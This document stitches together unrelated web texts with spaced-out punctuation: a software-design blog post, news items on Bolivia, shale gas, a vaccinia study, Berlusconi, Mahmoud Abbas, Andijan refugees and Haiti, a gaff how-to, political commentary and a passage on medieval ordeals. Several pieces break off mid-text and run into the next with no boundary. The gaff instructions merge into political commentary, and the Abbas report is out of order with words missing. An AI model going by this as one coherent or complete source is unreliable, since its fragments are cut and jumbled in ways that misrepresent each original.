I have always found that humility is a great asset when I have the gumption to tackle a big problem .
Humility keeps me alert to things I do n't understand or might not see otherwise , and it encourages me to take care at each step .
...
Now come a couple of principles that cause me to thing harder .
(2) Repeat design elements .
Duplication is a bane to software developers .
We long ago recognized that repetition of the same code creates so many problems for writing and modifying software that we have coined maxims such as " Do n't repeat yourself " and " Say it one once and only once . "
We even create acronyms such as DRY to get the idea across in three spare letters .
However , at another level , repetition is unavoidable .
A stack is a powerful way to organize and manipulate data , so we want to use one whenever it helps .
Rather than copy and paste the code , we create an abstract data type or a class and reuse the component by instantiating it .
Software reuse of this sort is how programmers repeat design elements .
Indeed , one of the most basic ideas in all of programming is the procedure , an abstraction of a repeated behavioral element .
It is fundamental to all programming , and one of the contributions that computer science made as we moved away from our roots in mathematics .
In the last two decades , programmers have begun to embrace repeatable design units at higher levels .
Design patterns recur across contexts , and so now we do our best to document them and share them with others .
Architectures and protocols and , yes , even our languages are ways to reify recurring patterns in a way that makes using them as convenient as possible .
(4) Avoid symmetry .
Some programmers may look at this principle and say , " Huh ?
How can this apply ?
I 'm not even sure what it means in the context of software . "
When linguistic structures and data structures repeat , they repeat just as they are , bringing a natural symmetry to the algorithms we use and the code we write .
But at the level of design patterns and architectures , things are not so simple .
Christopher Alexander , the building architect who is the intellectual forefather of the software patterns community , famously said that a pattern appears a million times , but never exactly the same .
The pattern is molded to fit the peculiar forces at play in each system .
This seems to me a form of breaking symmetry .
But we can take the idea of avoiding symmetry farther .
In the mathematical and scientific communities , there has long been a technical definition of symmetry in groups , as well as a corresponding definition of breaking symmetry in patterns .
Only a few people in the software community have taken this formal step with design patterns .
Chief among them are Jim Coplien and Liping Zhao .
Check out their book chapter , Symmetry Breaking in Software Patterns , if you 'd like to learn more .
A few years ago I was able to spend some time looking at this paper and at some of the scientific literature on patterns and symmetry breaking .
Unfortunately , I have not been able to return to it since .
I do n't yet fully understand these ideas , but I think I understand enough to see that there is something important here .
This glimmer convinces me that avoiding symmetry is perhaps an important principle for us software designers , one worthy of deeper investigation .
...
This leaves us with one more principle from the Presentation Zen article :
(5) Avoid the obvious in favor of the subtle
This is the one principle out of the seven that I think does not apply to writing software .
All other things being equal , we should prefer the obvious to the subtle .
Doing something that is n't obvious is the single best reason to write a comment in our code .
When we must do something unexpected by our readers , we must tell them what we have done and why .
Subtlety is an impediment to understanding code .
Perhaps this is a way in which we who work in software differ from creative artists .
Subtlety can enhance a work of art , by letting -- even requiring -- the mind to sense , explore , and discover something beyond the surface .
As much art as there is in good code , code is at its core a functional document .
Requiring maintenance programmers to mull over a procedure and to explore its hidden treasures only slows them down and increases the chances that they will make errors while changing it .
I love subtlety in algorithms and designs , and I think I 've learned a lot from reading code that engages me in a way I 've not experienced before .
But there is something dangerous about code in which subtlety becomes more important than what the program does .
Blaine Buxton recently wrote a nice entry on the idea of devilishly clever code :
But , it got me thinking about clever and production code .
In my opinion , clever is never good or wanted in production code .
It 's great to learn and understand clever code , though .
It 's a great mental workout to keep you sharp .
Maybe I am missing something subtle here ; I 've been accused of not seeing nuance before .
This may be like the principle of avoiding symmetry , but I have n't reached the glimmer of understanding yet .
Certainly , many people speak of Apple 's great success with subtle design that engages and appeals to users in a way that other design companies do not .
Others , though attribute its success to creating products that are intuitive to use .
To me , intuitiveness points more to obviousness and clarity than to subtlety .
And besides , Apple 's user experience is at the level of design Reynolds is talking about , not at the level of code .
I would love to hear examples , pro and con , of subtlety in code .
I 'd love to learn something new !
The president of Bolivia sets an example …
Translated from CubaDebate , March 2 , 2010
Bolivia ’s President Evo Morales has launched a five - day campaign , called “ Chile and Haiti need you , ” to raise funds for the two countries .
“ This is a solidarity campaign with two Latin American peoples who have suffered irreparable climate damage , ” said the Bolivian president .
Setting an example , Morales announced that he and his vice - president will contribute 50 % of their salary for the month , and that the other cabinet ministers will donate 30 % .
Funds raised during the five days will be channeled through and managed by the state bank .
The Bolivian leader said that the campaign goal is for Bolivia to contribute about 2 million dollars .

* CEO says world will not be oversupplied with shale gas
* CEO says global gas search down to 15 locations
* Shares down more than 5 pct
( Adds details on shale formations , stock price )
HOUSTON , Feb 4 ( Reuters ) - Large oil companies such as Exxon Mobil Corp XOM .
N snapping up shale - gas acreage overseas will likely find it hard to develop that land due to constraints such as infrastructure availability , the CEO of Chesapeake Energy Corp CHK .N said on Thursday .
“ I think they will have a hard time over there at the end of the day , ” Chesapeake Chief Executive Officer Aubrey McClendon said at the Credit Suisse Energy Summit in Vail , Colo .
McClendon , whose Oklahoma City , Okla . - company secured the right to drill for natural gas on 14 million acres in shale formations in the United States , said it will be hard for the oil majors who lost out in the domestic rush to catch up overseas .
“ I do n’t see the world being swamped by shale gas in the next 10 years , ” McClendon said in remarks broadcast over the Internet .
He noted he has yet to see a formation overseas that has the potential to rival those found in the United States .
To successfully develop a shale gas basin a company needs infrastructure such as processing facilities , indigenous demand for gas and favorable commercial terms .
Without those factors , many basins around the world are eliminated right away , the executive said .
In fact , Chesapeake and its joint venture partner Statoil ASA STL.OL have narrowed their search for an overseas shale play to about 15 basins , down from an initial survey of about 200 , McClendon said .
Exxon and ConocoPhillips COP.N , the third largest U.S. oil company , are building big acreage positions in countries such as Poland and Germany in a search for formations that hold vast amounts of natural gas .
Chesapeake shares fell more than 5 percent , or $ 1.41 , to $ 24.42 in afternoon trading on the New York Stock Exchange .
That decline compares with a drop of about 4 percent in the Philadelphia Stock Exchange 's index of natural gas companies .XNG .

New video footage of a virus infecting cells is challenging what researchers have long believed about how viruses spread , suggesting that scientists may be able to create new drugs to tackle some viruses .
Previously , viruses were thought to spread by entering a cell , replicating there , and then being released to infect new cells , so that the rate of spread of a virus would be limited by how quickly it could replicate in each cell .
However , a virus called vaccinia spreads in a different and much faster way , according to a new study in the journal Science by researchers from Imperial College London , funded by the Medical Research Council .
Vaccinia is a poxvirus and is the vaccine that was used to eradicate smallpox .
Using live video microscopy , the scientists discovered that it was spreading four times more quickly than thought possible , based on the rate at which it replicates .
Videos of virus - infected cells revealed that the virus spreads by surfing from cell to cell , using a mechanism that allows it to bounce past cells that are already infected and reach uninfected cells as quickly as possible .
Early after vaccinia infects a cell , it expresses two viral proteins on the cell surface , which marks the cell as infected .
When further virus particles reach the infected cell , these proteins cause the host cell to push out snake - like projections called " actin tails , " which drive the virus particles away towards other cells that they can infect .
The particles thus bounce from one cell surface to another until they land on an uninfected cell .

In the study , the researchers prevented the virus from making the proteins needed to make the actin tails in the early stages of infecting a cell and showed that this slowed the spread of the virus dramatically .
The researchers believe that other viruses also employ rapid spreading mechanisms .
For instance , herpes simplex virus ( HSV - 1 ) , which causes cold sores , spreads at a faster rate than should be possible given its replication rate .
Thus , this phenomenon discovered with vaccinia may be a common feature a viruses .
The discovery may ultimately enable scientists to create new antiviral drugs that target this spreading mechanism .
Lead study author Professor Geoffrey L. Smith , a Wellcome Trust Principal Research Fellow from the Section of Virology at Imperial College London , said : " The ability of viruses to spread rapidly is often critical for their ability to cause disease .
Therefore , understanding how viruses spread is fundamental to designing strategies to block spread and thereby prevent disease .
" For more than 50 years viruses were thought to spread by an iterative process of infection , replication , release and re-infection , so the rate of spread was limited by the speed of replication .
However , my colleagues Virginie Doceul , Mike Hollinshead and Lonnerke van der Linden discovered a novel spreading mechanism that is not limited by virus replication rate and accelerates spread dramatically .
" Shortly after infection vaccinia expresses two virus proteins on the cell surface that mark the cell as infected .
This effectively says to additional virus particles trying to infect the cell ' I 'm infected already , there is no point coming here , you need to go elsewhere . '
And remarkably the virus particles are physically repelled until they find an uninfected cell .
Thus the virus can spread quickly to distant uninfected cells without needing to replicate in each cell on the way .
" This fundamentally changes how we think about virus dissemination and similar strategies may very well be exploited by many viruses , " added Professor Smith .
How to Wear a Gaff .
When dressing as a woman , a man has to be careful not to reveal himself as a man .
This is especially difficult if you want to wear tight clothing .
This is where a gaff comes in .
It helps to flatten the male genitalia creating a smoothing effect in that area .
Follow these steps to wear a gaff .
Shave your pubic area before taping and putting on your gaff .
You do n't want to get your pubic hair caught in the tape or under the gaff because it will pull and hurt .
Tuck your testicles up in to the cavity of your abdomen .
This cavity is directly behind your testicles and is where they were located when you were young .
Be gentle .
If this is painful you 're doing it incorrectly .
Tape your testicles so they do n't fall out of the cavity .
Do not place the tape on your pubic hair if you failed to shave because the tape will be painful to remove .
Lie down and pull the gaff up to your thighs .
The wider part is the front of the gaff while the thinner portion is the back .
Just look at Frank Rich 's column today , which like MSNBC to FNC , which is the same dynamic , and the same understanding of politics , and its purposes .
In this worldview - which is now the worldview in American political analysis - ideology has infiltrated everything , it has saturated public and private , it has invaded even something sacred like religious faith , in which the mysteries of existence have been distilled in writing or even understanding the churches into a battle between " liberals " and " conservatives . "
People accuse me of pedantry or semantics in insisting that all of this - on the right and the left - is in fact a sign of the death of conservatism as a temperament or a politics , rather than its revival .
But I have been arguing this for more than a decade .
Conservatism , if it means anything , is a resistance to ideology and the world of ideas ideology represents , whether that ideology is a function of the left or the right .
In the mid-twentieth century conservatism revived itself by a profound critique of liberal hubris and rationalism , of liberals ' belief that they really could transform the world through better government , of the new left 's critique that the personal is political , and of the stifling of human nature , individualism and freedom that socialism and communism had wrought .
From the green shoots of Hayek and Oakeshott and Friedman to the final blooming of Thatcher and Reagan , this regenerated conservatism really did restore the balance between state and society toward society and away from the state .
It harnessed traditional impulses - nationalism in Britain , evangelicalism in America - but it never fully gave into them .
Its pragmatism remained in the Reagan tax hikes , Thatcher 's retention of socialized medicine , their mutual outreach to Gorbachev , and Thatcher 's insistence on international law .
In some ways , I believe , the pinnacle of this conservative achievement came in the presidency of George H W Bush and the premiership of John Major ( see my 1999 NYT essay , The End Of Britain " ) .
They both solidified the reforms of their predecessors , were the final forces that reformed the left , and made hard decisions - like raising taxes , entrenching international law in the liberation of Kuwait , or staying out of the euro - that look better and better the more time goes by .
That the first Bush is so widely reviled by the " movement " that passes for conservatism in America today , in favor of the brain - dead ressentiment of Palin or the philistine pseudo - intellectualism of Gingrich or the neo-imperial radicalism of the neoconservatives , is the smell of a decomposing corpse , not a newborn child .
I believe that although Obama is indeed a liberal in the sense that he believes government really can and must improve the lives of its citizens , he is much much more like a real conservative than his detractors on right and left .
The change he still represents at home is an abandonment of this ideological , red - blue abstract form of politics toward a realistic , pragmatic , reasonable center .
Abroad , he represents an attempt to defuse the dangerously polarizing religious and cultural warfare that is fomenting terrorism , and further fusing religion and politics in so many places across the world .
In this sense , I regard him as a vital , indispensable figure standing against the forces of ideology and religious warfare , whose failure could lead to catastrophic consequences for our future .

Much more than a collection of historical facts & figures , For Love of Liberty : The Story of America ’s Black Patriots is about heroes .
At its heart are the emotional , first - hand accounts of the men and women who were in harm 's way .
Since the earliest days of this nation , the hopes , fears , thoughts , and observations of these brave warriors have been preserved in a fascinating collection of written texts .
Objective , revealing , personal , compelling , heartbreaking and inspiring ; these memories of those long gone resonate through time via dramatic readings by Morgan Freeman , Mel Gibson , Bill Cosby , Susan Sarandon , John Travolta , Ossie Davis , Robert Duvall , Delroy Lindo , Sam Elliot , Danny Glover , Walter Cronkite , Isaac Hayes , John Goodman , Ice - T , James Garner , Robert Townsend , Alan Rickman , LeVar Burton , Roscoe Lee Browne , Ruby Dee , John Amos , Danny Glover , Eriq La Salle , Angela Bassett , Chris Cooper , Alfre Woodard , Cliff Robertson , Louis Gossett Jr. , Dulé Hill , Donald Sutherland , Blair Underwood , Kris Kristofferson , Anthony Chisholm , Isaiah Washington , Charles S.

Hale rose at 5:30 a.m. Tuesday , as usual , to swim laps before work .
Active though she is , however , the 55 - year - old Orange County woman was a bit stunned to learn the latest advice from researchers regarding exercise -- that women should work out 60 minutes a day , seven days a week , to maintain a normal weight over their lifetime .
“ Most people are going to say , ‘ No way .
I do n’t have time for that , ’ ” said Hale , a trim 5 - foot - 5 and 138 pounds .
The 60 - minute - a- day recommendation , released online Tuesday in the Journal of the American Medical Assn. , is aimed at women of normal weight who do n’t want to diet but do want to avoid gaining weight over time .
Most Americans gain about 1.5 pounds a year between age 25 and 55 .
But the issue of how much exercise is required to maintain a normal weight is far from settled .
Other exercise experts say that an average of 35 minutes a day , seven days a week , is probably sufficient .
But that ’s still a lot of exercise .
“ We wanted to see in regular folks -- people not on any particular diet -- what level of physical activity do you need to prevent weight gain over time , ” said the lead author of the study , Dr. I - Min Lee , an epidemiologist at Brigham and Women ’s Hospital in Boston and an associate professor of medicine at Harvard University .
“ It ’s a large amount of activity .
If you ’re not willing to do a high amount of activity , you need to curtail your calories a lot . ”
The study was based on surveys of more than 34,000 U.S. women who were , on average , age 54 at the start of it .
They reported their physical activity and weight , as well as health factors such as smoking and menopausal status , over 13 years .
On average , the women gained 5.7 pounds during the study .
Only those women who were normal weight at the start of the study and engaged in moderate - intensity activity an average of 60 minutes per day , seven days a week , maintained a normal body weight , defined as a body mass index of less than 25 .
That amount of exercise is three times higher than the amount recommended by the federal government -- 150 minutes per week -- to lower the risk of chronic ailments such as heart disease .
“ You can still do much for your health with a lower level of exercise , ” Lee said .
“ But if you want to exercise for weight control , it ’s 60 minutes a day . ”
Moderate - intensity activity was defined in the study as walking or hiking , jogging , running , bicycling , aerobic exercise or dance , use of exercise machines , yoga , tennis , squash , racquetball and swimming .
Housework and gardening were not included in the analysis .
It ’s unclear what level of physical activity younger women need to maintain weight .
Studies in men have consistently shown they require less exercise to maintain body weight .
The study does not prove that this level of exercise is the only factor in maintaining a normal weight .
It ’s possible that other factors contribute , said Dr. Samuel Klein , director of the Center for Human Nutrition at Washington University School of Medicine .
Klein was not involved in the new study .
“ Women who decide to be physically active may also decide to eat healthier and do other things to maintain a normal body weight , ” he said .
“ This study does n’t tell you it ’s the physical activity . ”
Some people who exercise a lot , he said , will eat more as a result .
Others will be so tired from exercise that they do n’t do much activity the rest of the day .
“ It ’s complex , ” Klein said .
“ It ’s all about energy balance .
It takes a very small imbalance to gain a significant amount of weight over many years . ”
Although few randomized , controlled studies -- the gold standard in research -- have looked at the issue of weight maintenance over time , they tend to point to about 200 to 250 minutes of exercise a week , said Dr. Joseph E. Donnelly , director of the Energy Balance Laboratory at the University of Kansas .
“ But there is huge individual variation , ” he said .
“ It ’s very difficult to filter out what it takes for the average person not to gain weight when you do n’t do randomized studies . ”
Given the new advice , however , Hale says she ’s happy she took up swimming .
“ It ’s easy on my joints , ” she said , “ and it ’s something I ’ll be able to do the rest of my life . ”

I am proud to be gay , says pop star Ricky Martin
The singer said writing his memoirs had helped him with his decision Puerto Rican pop star Ricky Martin has announced he is gay , ending years of speculation over his sexuality .
Martin , who has sold more than 60 million albums , said in a statement on his website he was " proud to say " he was " a fortunate homosexual man " .
He added that he had kept his sexuality hidden because advisers had told him coming out could hurt his career .
Martin 's biggest hit is Livin ' La Vida Loca - a 1999 single that reached number one in more than 20 countries .
The singer , who began his career in the 1980s with Puerto Rican boy band Menudo , also had hits with She Bangs and Shake Your Bon Bon .
Martin , who fathered two children with a surrogate mother two years ago , said his decision to write his memoirs had helped him to free " things that were too heavy to keep inside " .
Ricky Martin statement
Send us your comments " Not sharing with the world my entire truth " about his sexuality , he continued , had become " a self - fulfilling prophecy of sabotage " .
Becoming a father , he went on , had convinced him " enough [ was ] enough " and that things " had to change " .
" To keep living as I did ... would be to indirectly diminish the glow that my kids were born with , " he said in a posting written in both English and Spanish .
Martin had previously remained tight - lipped about his sexual orientation , refusing to answer interviewer Barbara Walters when she raised the topic in 2000 .
In recent years the singer has become an advocate for children 's charities , setting up his own foundation against human trafficking .

" Italië is geen democratie meer .
Sommige politicologen noemen het een ' democratuur ' .
Een kruising tussen democratie en dictatuur , een dictatuur die formeel een democratie is . "
Aanstaande maandag verschijnt de Nederlandse vertaling van het boek ' Papi ' , over de vele schandalen rond de Italiaanse premier Silvio Berlusconi .
De schrijver , de Italiaanse journalist Marco Travaglio , noemt het geen roddelkroniek maar een noodzakelijk boek , omdat de media zo gecontroleerd worden door Berlusconi dat het voor de Italianen heel moeilijk is om goede informatie te krijgen .
Volgens hem is men in het buitenland veel beter op de hoogte van wat er in Italië gebeurt dan in Italië zelf .
" De Italianen kijken naar een TV die eigendom is van Berlusconi .
Met journalisten die door hem betaald worden en hoofdredacteuren die door hem benoemd worden .
Ze krijgen de informatie die Berlusconi wil laten zien .
En dat is niet de werkelijkheid . "
" Er wordt nooit verteld dat de processen tegen Berlusconi al vijftien jaar plaatsvinden omdat hij misdrijven pleegt , maar altijd dat de processen bestaan omdat rechters uit politieke motieven Berlusconi vervolgen .
Het is de omgekeerde wereld .
Wat Berlusconi ook doet , het is nooit zijn schuld .
Maar altijd van een samenzwering tegen hem . "
Seksschandaal Neem het seksschandaal rond Berlusconi vorig jaar .
In de oppositiegezinde pers werd uitgebreid bericht over de vrouwen die hij in zijn villa 's ontving .
Maar op de belangrijkste tv-journaals niet .
Ook niet op die van de staatsomroep , want ook die worden grotendeels door Berlusconi gecontroleerd .
Terwijl het schandaal ook een politieke lading had , zegt Travaglio .
" Hij heeft tientallen meisjes bij zich thuis gehad en die vervolgens bij verkiezingen op de kandidatenlijsten van zijn partij gezet .
Totdat zijn vrouw dit schandaal openbaar maakte . "
" Toen heeft Berlusconi ze op het allerlaatste moment van de lijsten gehaald , in de hoop zijn huwelijk althans voor de vorm te kunnen redden .
Nu zet hij ze stiekem op de kieslijsten voor de lokale verkiezingen .
Sommigen hebben meegedaan met de Europese verkiezingen .
Anderen zijn minister geworden . "
Verdoofd
In Italië bestaat nauwelijks een traditie van objectieve journalistiek .
Iedere krant of televisiejournaal heeft een politieke kleur en geeft een eigen draai aan het nieuws .
Meningen zijn belangrijker dan feiten .
" Italianen zijn afhankelijk van de TV .
Ze lezen heel weinig .
Ze gebruiken nauwelijks internet , behalve de jongeren en die mogen vaak nog niet stemmen .
Het controleren van de televisie is dus van fundamenteel belang . "
" De televisiezenders creëren een soort totale verdoving waardoor niemand meer begrijpt wie wat precies gedaan heeft .
Berlusconi wordt wel van iets beschuldigd , maar je weet nooit of het wel of niet waar is .
De mensen stellen hun oordeel altijd maar uit . "
Berlusconisme - light
Het ligt volgens Travaglio ook aan de zwakke oppositie in het land .
" De centrum - linkse partijen hadden een politiek en moreel alternatief moeten bieden , maar dat hebben ze niet gedaan .
Ze waren zelf ook zo corrupt dat het ze goed uitkwam dat Berlusconi de vrije informatiegaring en de rechterlijke macht kapot maakte . "
" De verrotte politieke klasse hier wil helemaal geen onafhankelijke rechters of een vrije pers .
Bijna iedereen is doodsbang dat er weer een smeergeldschandaal komt zoals begin jaren 90 .
Want zowel rechts als links is gewoon doorgegaan met stelen . "
" Ze hebben links omgevormd tot een nette versie van het Berlusconisme .
Er bestaan geen twee verschillende visies op de maatschappij .
Je hebt de pure variant van het Berlusconisme , die van Berlusconi .
En de light - variant , van centrum - links . "

In an interview with an Arab - languageRussian TV channel , Abbas explained that while he feels east and west must not be divided in practice , it wasimportant that it would be clear which part of the capital belongs to the Palestiniansand which part belongs to Israel .
The PA president said that the Israelidemand to be recognized as a Jewish state appeared only in the 1947 partitionplan , hinting that Israel would have to implement that plan in order to gain recognition as a Jewishstate .
cnxps.cmd.push(function ( ) { cnxps ( { playerId : '36af7c51-0caf-4741-9824-2c941fc6c17b ' }) .render('4c4d856e0e6f4e3d808bbc1715e132f6 ' ) ; } ) ;
Abbas went on to explain that hecould not resume peace talks with Israel without agreeing on basic issues andwhile Israel continued construction in east Jerusalem , because the peaceprocess would suffer a serious blow already after the first meeting .
“ What if they say in this meetingthat they do not accept the ’ 67 borders and are not prepared to discuss [ theissues of ] and the [ return of Palestinian ] refugees ?
What would we talk about ? ” Abbas wasquoted as telling the Russian TV channel .
“ If I engage in negotiations while constructionin goes on – they will say that is theirs , since I was willing to resume talks while construction continued . ”
has rejected two ideas about resuming the peace talks , consolidated by the PA , and , Abbas claimed .
Those ideasreportedly included a short building moratorium in the West Bank and eastJerusalem , Israeli recognition of international decisions and the resumptionof peace talks from the point they were halted in December 2008 , under then - primeminister Ehud Olmert .
Palestinian Authority PresidentMahmoud Abbas on Thursday said that the Palestinians would not accept Abu Dis , atown between Jerusalem and Ma'aleh Adumim thatis currently controlled by the PA , as the capital of their future state , but would insiston receiving control over east Jerusalem .
Five years ago , soldiers opened fire on demonstrators in the city of Andijan , Uzbekistan , killing hundreds .
Terrorists , said the government .
Peaceful protesters , said human rights groups .
The BBC's Monica Whitlock was expelled - but she met up again recently with one group of survivors , this time in Sweden .
Uzbek women and children at the Andijan demonstration " This place , " says Bahram , shouting somewhat , " is amazing !
You can't imagine !
The schools , the hospitals !
The way they live !
And nothing 's done by hand !
Even the baking !
Even cleaning the street !
They have these little carts ... you just press a button .
The police !
They smile at you and say ' Hey ! ' "
It was good to see him again .
We last met in Andijan on a hot afternoon in May , 2005 , as the demonstration reached its height .
Bahram had been desperately worried that things were about to implode .
The next day , the troops moved in .
His son was shot dead .
Bahram disappeared - a cake - shop owner , a grandfather , hiding and moving from house to house , country to country - until the United Nations found him .
And now here we were on the Baltic coast .
Frozen ships in a bay of ice .
Quiet streets .
Glittering shops .
Prints of warm boots in the snow .
It is another world - a looking glass through which the Uzbeks see themselves and their country .
So even as Sweden amazes and delights Bahram , it breaks his heart .
" If we had just a fragment of this development in Uzbekistan , " he says .
" If I could take just a tiny part of this when I go home ... "
Tapped phones Bahram , and all the Andijanis , are sure they will go home - one day .
Until then , they try to stay in touch as best they can .
They gaze into computer screens to catch a glimpse through Skype of families they 've left behind .
For some survivors , the clock stopped that day in May ... but Bahram and Shamshuddin have found some meaning in their transformation .
Back home , relatives upload shaky photos of weddings and children they 've never seen .
Piercing sunshine , blue skies , yellow dust - it 's home but behind glass .
A reflection .
They can't chat on the phone , only " Hello and how are you ? " .
Uzbek phones are , of course , tapped .
Somehow this slight , virtual contact only underlines how very far away the Andijanis are .
Bahram parcels out his days in tiny , manageable steps that keep him from tipping into despair .
Breakfast .
Prayers .
Language lessons through the internet .
Watering the plants on every window sill .
Lunch - cooked by Andijani women and brought over hot .
Prayers .
Television time - and another day is done , another notch on the long measure of days that have already become years .
He has not acquired nor desired any possessions in this rich land .
No distractions .
He spends this measured time , instead , thinking , peering deeply into the looking glass .
" Here in Sweden there are laws , " he says .
" And even the government obeys them !
There was a minister who did not pay his TV licence - and he lost his job .
Can you imagine ?
And the way they treat people !
We saw a prison and do you know , in the canteen , the prisoners take a tray and chose the food they want .
Different salads , meats , yogurt everything .
Fresh !
In prison !
Oh my lord above ! "
Lucky escape Back home , Bahram spent six years accused , like thousands of people in Uzbekistan , of conspiring against the state .
He was beaten daily and his legs frozen with ice water .
The Swedish doctors have now fixed his legs .
The younger Andijanis , too , reflect deeply on the extraordinary shift in their lives : " We have learnt so much by being here , " says Shamshuddin .
Five years ago , aged 29 , he lay among the dead and dying in the square at Andijan .
By luck alone , he escaped .
He walked through the night out of Uzbekistan and into Kyrgyzstan .
And there was the outside world : the foreign press , cameras , the United Nations .
Shamshuddin was among this group of refugees
He went to a Red Cross camp and became a news item - an image , a refugee .
" Only a day , " he says .
" On 13 May I had hopes , a family , my wife , three children , a house , a car , a business .
By 14 May ?
Nothing .
Not even a passport .
I even wore another man 's clothes , in another man 's country .
Just a day , and I was somebody else . "
Poised to leave Shamshuddin has kept his mind together with the most extraordinary resolve during his five lonely years in Sweden .
He 's learnt Swedish , worked hard , bought a car , set up a business and plans to open a cafe in Stockholm .
And just before we arrived - the greatest news .
His wife and family arrived in Sweden to join him , including the son he'd only seen as a new baby , now six years old .
They 're already dressed in the bright , cosy clothes of Swedish children , swinging back - packs on their way to school .
For some survivors , the clock stopped on that day in May .
Only the pain of separation is real .
Others , like Bahram and Shamshuddin , have managed to find some meaning in their transformation .
Yet all the Uzbeks we met living along the frozen Baltic coast all have the air of people poised to leave again .
Arriving with nothing , they could sweep their lives into suitcases in half an hour , happily leaving behind this fancy new country - if it was safe to go home .
They are people still on a journey , still on their way through the looking glass .

Is Debra Medina the next Scott Brown ?
Nobody -- well , hardly anybody outside perhaps the Medina household -- expects the small business owner and anti-Washington crusader to be the next governor of Texas .
Heck , until recently she was n’t even much of a factor in the shoot - 'em - up between the two leviathans of Lone Star politics , Gov. Rick Perry and Sen. Kay Bailey Hutchison .
Then again , up until a couple of weeks out , nobody thought Brown -- a little - known state senator and ex-Cosmo model -- stood much chance of swiping the Massachusetts Senate seat held for almost a half century by the late Edward M. Kennedy .
That said , a poll out Tuesday is raising eyebrows all over Texas .
The survey by Public Policy Polling showed Perry leading the GOP field with 39 % , followed by Hutchison at 28 % and Medina -- a favorite of the Tea Party crowd -- at 24 % .
More significant , among self - identified conservatives -- those most likely to turn out in the March 2 primary -- Perry had 42 % support to Medina ’s 25 % and Hutchison ’s 23 % .
Given the survey ’s 4.8 % margin of error , Hutchison , long considered the most popular politician in Texas , is effectively tied with the little - known , meagerly funded Medina .
( How meagerly ?
As of Tuesday , she had raised less than $ 600,000 , a pittance compared to the $ 50 million Perry and Hutchison are expected to spend between them . )
Of course , no poll can be taken as gospel .
The survey , conducted after last month ’s second and final GOP gubernatorial debate , had a fairly small sample : 423 likely Republican voters .
Still , it seems ...
PORT -AU - PRINCE , Haiti ( AP ) — Haitian police detained 10 Americans on Saturday on suspicion of trying to take children out of the country without proper papers amid the chaos following the Jan. 12 earthquake .
The Americans were taken into custody with about 33 children while trying to reach the Dominican Republic , said Communications Minister Marie - Laurence Jocelyn Lassegue .

“ There are allegations of child trafficking and that really could n’t be farther from the truth , ” said Sean Lankford of Meridian , Idaho , whose wife and daughter were among those detained .
“ They were going to get the medical attention they needed .
They were going to get the clothes and the food and the love they need to be healthy and to start recovering from the tragedy that just happened , ” Lankford told The Associated Press .
State Department officials confirmed that U.S. citizens were arrested while applying to enter the Dominican Republic with a group of children .
They said consular officials were seeking access to the detained Americans and were providing all possible assistance .
The official spoke anonymously because discussion of the case was not authorized .
The group had intended to take the children to an orphanage they had set up at a hotel in the Dominican Republic , and thought they had the proper paperwork , said Lankford .
Idaho friends and relatives have been in touch with those detained via text message and phone calls , he said .

Haiti has imposed new controls on adoptions since the Jan. 12 earthquake .
The government now requires Prime Minister Max Bellerive to personally authorize the departure of any child as a way to prevent child trafficking .
Officials estimate that thousands of kids have been separated from their parents or orphaned by the earthquake .
Five of the 10 being held are from the Central Valley Baptist Church in Meridian , and the others are from the East Side Baptist Church in Twin Falls , Idaho .

“ Of course I ’m concerned for my wife and my daughter , ” he said .
“ They were hoping to make a difference and be able to help those kids . ”

( Corrects headline to read US Jan payrolls instead of Dec payrolls )
* WHAT : U.S. January employment report
* WHEN : Friday , Feb. 5 at 8:30 a.m. ( 1330 GMT )
REUTERS FORECASTS :
The median forecast for nonfarm payrolls is for an increase of 5,000 after an unexpected 85,000 drop in December .
Forecasts range from a decrease of 97,000 to an increase of 100,000 .
The unemployment rate is seen rising to 10.1 percent from 10 percent in December .
Forecasts range from 9.8 percent to 10.2 percent .
The average work week is seen steady at 33.2 hours , with forecasts ranging from 33.2 - 33.3 hours .
FACTORS TO WATCH
Nonfarm payrolls are expected to have increased in January , only the second time since December 2007 , when the worst economic downturn in 70 years started .
Payrolls grew by 4,000 in November .
Temporary hiring is picking up and labor market indicators during the month have pointed to an improving jobs situation .
January ’s report will include the annual benchmark revision to payrolls data back to March 2008 .
The Department of Labor has estimated that the level of employment for the 12 months to March 2009 will be revised down by about 824,000 , meaning the economy shed far more jobs than previously thought .
Monthly payrolls from March 2008 to March 2009 will likely be revised .
Analysts blame the over - counting of employment on the so - called birth - death model that the department uses in its monthly report to try to estimate how many companies opened or closed , a process that has worked well in the past .
The weather is a wild card for January payrolls .
Given a rise in job losses in weather - sensitive sectors such as construction and leisure in December , analysts believe below - normal temperatures contributed to the surprise 85,000 drop in payrolls that month .
The unusually cold weather continued into the early part of January and analysts are unsure how much of a bounce back in construction employment will be seen in January .
Regardless of the outcome of the revisions and January ’s data , the labor market remains on track for growth later in the year , analysts say .
A gain in payrolls in January will be a confidence boost for households and may encourage consumers to spend more .
It could give President Barack Obama some breathing space .
Discontent over unemployment contributed to political defeat for Obama ’s Democrats in an election last month , costing them a crucial Senate seat and foreshadowing potentially big losses for the party in the November congressional elections .
The unemployment rate is expected to edge up to 10.1 percent from 10 percent in December .
The jobless rate is viewed as one of the factors that will determine the timing of the Federal Reserve ’s first interest rate increase since slashing overnight lending rates to near zero in December 2008 .
MARKET REACTION
The payrolls report could spark further downside for stocks if it shows a worsening of the labor market .
Key indexes are sitting precariously at support after violating their 50 - day moving averages last week as investors worried about bank regulation , fiscal troubles out of Europe and China ’s efforts to prevent its economy from overheating .
With the S&P 500 having breached the key 1,085 level , the benchmark index is seen finding some support at the 1,072 level .
Failing that , the subsequent support level is pegged at 1,030 -- the low - end of the November - December trading range .

First , consider the reasoning of the defendants .
Guilty believers expected God to reveal their guilt by harming them in the ordeal .
They anticipated being boiled and convicted .
Innocent believers , meanwhile , expected God to protect them in the ordeal .
They anticipated escaping unscathed , and being exonerated .
How might these trials have worked , without divine intervention ?
The key insight is that ordeals were n’t just widely practiced .
They were widely believed in .
It ’s this belief - literally , the fear of God - that could have allowed the ordeals to function effectively .
Ordeals were based on a medieval superstition called “ iudicium Dei ” - the judgment of God .
According to this belief , God helped man resolve judicial matters through trials of fire and water .
The superstitious “ logic ” that underlay ordeals was based on divine intervention .
God , the thinking went , saved innocent defendants from being burned in hot ordeals and allowed guiltless men to sink in water “ over which He hath thundered ” in cold ones .
The ordeal , then , offered a way for God to render judgment .
But a closer look suggests something very different :
The ordeal system worked surprisingly well .
It accurately determined who was guilty and who was innocent , sorting genuine criminals from those who had been wrongly accused .
Stranger still , the ordeal system suggests that pervasive superstition can be good for society .
Medieval legal systems leveraged citizens ’ superstitious beliefs through ordeals , making it possible to secure criminal justice where it would have otherwise been impossible to do so .
Some superstitions , at least , may evolve and persist for a good reason :
